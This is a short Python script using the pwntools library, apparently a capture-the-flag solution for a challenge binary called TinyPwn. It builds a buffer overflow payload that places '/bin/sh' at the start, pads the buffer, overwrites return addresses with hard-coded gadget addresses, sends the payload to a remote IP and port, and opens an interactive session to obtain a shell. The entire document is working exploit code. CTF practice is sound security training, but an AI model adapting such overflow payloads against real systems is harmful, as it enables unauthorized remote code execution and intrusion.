from pwn import *

r = process("./TinyPwn")
r = remote("159.65.125.233", 6009)

payload = "/bin/sh\x00" + "B"*(0x148-(8*4) - 8)
payload += p64(0x00000000004000ed)
payload += p64(0x400101)
payload += "A"*(0x142-len(payload)-1)

r.sendline(payload)
r.interactive()
